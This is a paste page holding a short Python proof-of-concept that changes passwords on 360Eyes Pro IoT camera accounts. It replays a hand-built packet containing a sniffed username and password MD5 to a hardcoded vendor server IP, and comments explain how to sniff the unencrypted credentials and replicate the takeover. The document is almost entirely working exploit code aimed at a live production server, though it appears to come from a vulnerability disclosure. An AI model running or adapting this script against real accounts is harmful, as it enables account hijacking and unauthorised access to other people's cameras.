

[sourcehut](https://sr.ht)

[Log in](https://meta.sr.ht/oauth/authorize?client_id=1c1ad452ce596d6c&scopes=profile&state=%2F~edaigle%2F0b4a037fbd3166c8c72fee18efaa7decaf75b0ab%3F)
â€”
[Register](https://meta.sr.ht)

## [~edaigle](/~edaigle)/change\_pass.py unlisted

* [view paste](/~edaigle/0b4a037fbd3166c8c72fee18efaa7decaf75b0ab)

[#](#change_pass.py)

change\_pass.py
-rw-r--r--

1.8 KiB

[View raw](/blob/fcd5568921cbbfa09d3938e0f988f9de123f39ae)

```

```
```
[1](#change_pass.py-L1)
[2](#change_pass.py-L2)
[3](#change_pass.py-L3)
[4](#change_pass.py-L4)
[5](#change_pass.py-L5)
[6](#change_pass.py-L6)
[7](#change_pass.py-L7)
[8](#change_pass.py-L8)
[9](#change_pass.py-L9)
[10](#change_pass.py-L10)
[11](#change_pass.py-L11)
[12](#change_pass.py-L12)
[13](#change_pass.py-L13)
[14](#change_pass.py-L14)
[15](#change_pass.py-L15)
[16](#change_pass.py-L16)
[17](#change_pass.py-L17)
[18](#change_pass.py-L18)
[19](#change_pass.py-L19)
[20](#change_pass.py-L20)
[21](#change_pass.py-L21)
[22](#change_pass.py-L22)
[23](#change_pass.py-L23)
[24](#change_pass.py-L24)
[25](#change_pass.py-L25)
[26](#change_pass.py-L26)
[27](#change_pass.py-L27)
[28](#change_pass.py-L28)
[29](#change_pass.py-L29)
[30](#change_pass.py-L30)
[31](#change_pass.py-L31)
[32](#change_pass.py-L32)
[33](#change_pass.py-L33)
[34](#change_pass.py-L34)
[35](#change_pass.py-L35)
[36](#change_pass.py-L36)
[37](#change_pass.py-L37)
[38](#change_pass.py-L38)
[39](#change_pass.py-L39)
[40](#change_pass.py-L40)
[41](#change_pass.py-L41)
[42](#change_pass.py-L42)
[43](#change_pass.py-L43)
[44](#change_pass.py-L44)
```
```
# 360Eyes Pro Password Change PoC
# Copyright 2024 Eric Daigle
#
# Instructions to Replicate:
# 1. Download 360Eyes Pro application from Play Store
#
# 2. Create an account and sign out
#
# 3. Run this script with required arguments. Note that MD5 of old password can
#    be trivially obtained by anyone on the network through Wireshark, as the
#    password change packet is sent unencrypted.
#
# 4. Try to sign back in to the account, observe password has been changed
#
# For demo convenience, some hashes are provided:
# MD5(iotpwn1) = f169ce871fb7f41dd78bf69ac1363190
# MD5(iotpwn2) = 3fcae8ed3011cb1852c19acb6e265cb9
import argparse
import hashlib
import socket

HOST, PORT = "52.8.101.180", 19000

parser = argparse.ArgumentParser("change_pass")
parser.add_argument("username", help="The sniffed username, in plain text", type=str)
parser.add_argument("old_pass_md5", help="The sniffed MD5 of the old password, in plain text", type=str)
parser.add_argument("new_pass", help="The new password you'd like to set", type=str)
args = parser.parse_args()

new_pass_md5 = hashlib.md5(args.new_pass.encode("utf-8")).hexdigest()

data = bytes.fromhex(f"ccddeeff1d270000e4126900d400000000000000235f3336306579657323{str.encode(args.username).hex()}0000000000000000000000000000000000000000000000000000000000000000{str.encode(args.old_pass_md5).hex()}0000000000000000000000000000000000000000000000000000000000000000{str.encode(new_pass_md5).hex()}0000000000000000000000000000000000000000000000000000000000000000")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST, PORT))
    sock.sendall(data)
    received = sock.recv(1024)

print(f"Sent:\n{data.hex()}")

if received.hex() == "ccddeeff1d270000e51269001400000000000000":
    print("Success")
else:
    print("Error response, double-check your inputs")

```

